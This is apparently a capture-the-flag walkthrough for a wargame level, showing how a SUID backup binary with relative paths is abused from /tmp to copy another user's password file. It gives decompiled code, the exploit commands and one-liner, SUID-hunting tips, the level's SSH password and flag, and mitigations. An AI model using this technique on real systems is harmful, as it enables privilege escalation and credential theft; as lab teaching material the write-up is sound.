# 🔐 Level08 - SUID Path Manipulation

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to escalate privileges through a relative path vulnerability in a SUID binary!

## 📋 Binary Analysis

### 🔍 Architecture & Security

**Platform:** x86-64 (64-bit ELF)

**File Permissions:**
```bash
-rwsr-s---+ 1 level09 users 12975 Sep 10 2016 level08
```

**Key observations:**
- **SUID bit set** (`s` in user execute position)
- **SGID bit set** (`s` in group execute position)
- Owned by `level09` user
- Binary runs with **effective UID of level09** regardless of who executes it
- Can read files owned by `level09` (including `.pass`)

### Decompiled Code

#### Main Function

```c
int main(int argc, char **argv)
{
    FILE *log_fp;
    FILE *source_fp;
    int backup_fd;
    int char_read;
    char backup_path[104];
    char c;
    
    // Check command line arguments
    if (argc != 2) {
        printf("Usage: %s filename\n", argv[0]);
    }
    
    // VULNERABILITY: Uses relative path "./backups/"
    // CWE-426: Untrusted Search Path
    // The backup directory is relative to current working directory
    // Attacker can control where backups are written by changing CWD
    
    // Open log file (also relative path)
    log_fp = fopen("./backups/.log", "w");
    if (log_fp == NULL) {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }
    
    // Log the start of backup operation
    // NOTE: argv[1] is passed to log_wrapper as format string (vulnerable!)
    log_wrapper(log_fp, "Starting back up: ", argv[1]);
    
    // Open source file for reading
    // IMPORTANT: If binary has SUID bit, it can read files owned by the SUID user
    source_fp = fopen(argv[1], "r");
    if (source_fp == NULL) {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }
    
    // Construct backup path: "./backups/" + argv[1]
    // Example: argv[1] = "/etc/passwd" → backup_path = "./backups//etc/passwd"
    strncpy(backup_path, "./backups/", 11);
    strncat(backup_path, argv[1], 99 - strlen(backup_path));
    
    // Create backup file with specific flags:
    // O_WRONLY: Write-only
    // O_CREAT: Create if doesn't exist
    // O_EXCL: Fail if file already exists (prevents overwriting)
    // Permissions: 0660 (rw-rw----)
    backup_fd = open(backup_path, O_WRONLY | O_CREAT | O_EXCL, 0660);
    if (backup_fd < 0) {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }
    
    // Copy file byte-by-byte from source to backup
    while ((char_read = fgetc(source_fp)) != EOF) {
        c = (char)char_read;
        write(backup_fd, &c, 1);
    }
    
    // Log completion
    log_wrapper(log_fp, "Finished back up ", argv[1]);
    
    // Cleanup
    fclose(source_fp);
    close(backup_fd);
    
    return 0;
}
```

#### Log Wrapper Function

```c
void log_wrapper(FILE *log_file, char *prefix, char *msg)
{
    char buffer[264];
    
    // Copy prefix to buffer
    strcpy(buffer, prefix);
    
    // CRITICAL FLAW: msg is used as format string!
    // If msg contains format specifiers like %p, %x, %s, they will be interpreted
    snprintf(buffer + strlen(buffer), 254 - strlen(buffer), msg);
    
    // Remove trailing newline if present
    buffer[strcspn(buffer, "\n")] = '\0';
    
    // Write to log file
    fprintf(log_file, "LOG: %s\n", buffer);
}
```

## 🚨 Vulnerability

### Primary: Untrusted Search Path (CWE-426)

The binary uses **relative paths** instead of absolute paths:

```c
strncpy(backup_path, "./backups/", 11);
strncat(backup_path, argv[1], 99 - strlen(backup_path));
```

**Why this is dangerous:**

1. **Relative paths are resolved from the current working directory (CWD)**
   - If run from `/home/users/level08`, `./backups/` → `/home/users/level08/backups/`
   - If run from `/tmp`, `./backups/` → `/tmp/backups/`

2. **Attacker controls the working directory**
   - We can `cd` to any world-writable directory (like `/tmp`)
   - The binary will write backups to our controlled location

3. **Combined with SUID privileges, this is devastating**
   - Binary can read protected files (`/home/users/level09/.pass`)
   - Binary writes copies to our controlled directory
   - We can read the copied files with normal privileges

**Path Resolution Example:**

```
CWD: /tmp
Argument: /home/users/level09/.pass
Backup path: ./backups/ + /home/users/level09/.pass
Result: /tmp/backups/home/users/level09/.pass
```

The double slash `//` in the path is harmless—Unix treats multiple slashes as a single separator.

### SUID Privilege Escalation Mechanics

**What is SUID?**

SUID (Set User ID) is a special permission bit that allows a program to run with the privileges of the file owner, not the user executing it.

**Permission breakdown:**
```bash
-rwsr-s---+ 1 level09 users 12975 Sep 10 2016 level08
 ^^^
 ||└─ Execute bit replaced with 's' (SUID)
 |└── Write permission for owner
 └─── Read permission for owner
```

**How it works:**
- **Real UID:** The user who executed the binary (level08)
- **Effective UID:** The owner of the binary (level09)
- **File access:** Determined by effective UID

**System calls involved:**
```c
// When binary is executed with SUID:
setuid(level09_uid);  // Set effective UID to level09
fopen("/home/users/level09/.pass", "r");  // Access check uses effective UID
// Result: Access granted! ✅
```

## 🎯 The Attack

### Strategy

Our attack leverages three key facts:

1. **Binary runs with level09 privileges** → Can read `.pass`
2. **Binary uses relative path** → We control where backups are written
3. **We can read files we create** → Get the password from our copy

### Directory Structure Setup

**What we create:**
```
/tmp/
└── backups/
    └── home/
        └── users/
            └── level09/
                └── .pass  (will be created by binary)
```

**Why `/tmp`?**
- World-writable directory
- Any user can create files/directories
- No special permissions required

### Execution Flow

```
┌─────────────────────────────────────────────────────────────┐
│ Step 1: User executes: ~/level08 /home/users/level09/.pass │
│         from /tmp directory                                 │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 2: Binary runs with level09 privileges (SUID)         │
│         Effective UID = level09                             │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 3: fopen("/home/users/level09/.pass", "r")            │
│         Access check: effective UID = level09 ✅            │
│         File opened successfully!                           │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 4: Backup path constructed:                           │
│         "./backups/" + "/home/users/level09/.pass"         │
│         = "./backups//home/users/level09/.pass"            │
│         CWD is /tmp, so absolute path:                     │
│         = "/tmp/backups/home/users/level09/.pass"          │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 5: File copied to /tmp/backups/home/users/level09/.pass│
│         Owner: level08 (our user)                           │
│         Permissions: rw-rw---- (0660)                       │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ Step 6: We read /tmp/backups/home/users/level09/.pass      │
│         Access check: we own the file ✅                    │
│         Password revealed! 🎉                               │
└─────────────────────────────────────────────────────────────┘
```

## 💣 Exploit

### Complete Attack Sequence

```bash
# Connect to the system
ssh level08@localhost -p 2222
# Password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

# Change to world-writable directory
cd /tmp

# Create directory structure matching the target path
mkdir -p backups/home/users/level09

# Execute the SUID binary with the protected file as argument
~/level08 /home/users/level09/.pass

# Read the copied password
cat /tmp/backups/home/users/level09/.pass
```

### Expected Output

**After running `~/level08 /home/users/level09/.pass`:**
```
LOG: Starting back up: /home/users/level09/.pass
LOG: Finished back up /home/users/level09/.pass
```

**Verification:**
```bash
ls -la /tmp/backups/home/users/level09/
```

**Output:**
```
total 12
drwxrwxr-x 2 level08 level08 4096 Feb 13 10:30 .
drwxrwxr-x 3 level08 level08 4096 Feb 13 10:30 ..
-rw-rw---- 1 level08 level08   41 Feb 13 10:30 .pass
```

**Key observations:**
- File owner: `level08` (us!)
- Permissions: `rw-rw----` (we can read it)
- File exists in our controlled directory

**Reading the flag:**
```bash
cat /tmp/backups/home/users/level09/.pass
```

**Flag:**
```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

### One-liner Exploit

```bash
cd /tmp && mkdir -p backups/home/users/level09 && ~/level08 /home/users/level09/.pass && cat /tmp/backups/home/users/level09/.pass
```

> 💡 **Pro Tip #1:** Always check SUID binaries with `ls -la`. The `s` in permissions is your signal for potential privilege escalation.

> 💡 **Pro Tip #2:** The `/tmp` directory is world-writable and often the first place to test path manipulation exploits.

> 💡 **Pro Tip #3:** Use `find / -perm -4000 2>/dev/null` to discover all SUID binaries on a system for privilege escalation hunting.

## 🔒 Security Notes

### CWE References

- **CWE-426:** Untrusted Search Path
  - Severity: High
  - Description: Program uses a search path with an untrusted directory
  - Impact: Arbitrary file read/write, privilege escalation

- **CWE-134:** Uncontrolled Format String (bonus vulnerability)
  - Severity: High
  - Description: User input used as format string
  - Impact: Information disclosure, arbitrary memory read/write

### Mitigations

**For this binary:**

1. **Use absolute paths:**
```c
#define BACKUP_DIR "/home/users/level08/backups/"
strcpy(backup_path, BACKUP_DIR);
```

2. **Validate input paths:**
```c
if (strstr(argv[1], "..") != NULL) {
    fprintf(stderr, "Path traversal detected\n");
    exit(1);
}
```

3. **Drop privileges:**
```c
uid_t real_uid = getuid();
setuid(real_uid);  // Drop to real user's privileges
```

4. **Fix format string:**
```c
snprintf(buffer + strlen(buffer), 254 - strlen(buffer), "%s", msg);
```

**System-wide hardening:**
- Use filesystem capabilities instead of SUID where possible
- Enable kernel protections (ASLR, SELinux, AppArmor)
- Regular audits of SUID binaries: `find / -perm -4000 -ls`
- Remove unnecessary SUID bits: `chmod u-s /path/to/binary`

## 🎉 Victory!

![Mission Success](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

You've successfully escalated privileges by exploiting a relative path vulnerability in a SUID binary! This technique is commonly used in real-world penetration testing when discovering misconfigured privileged programs.

On to level09!
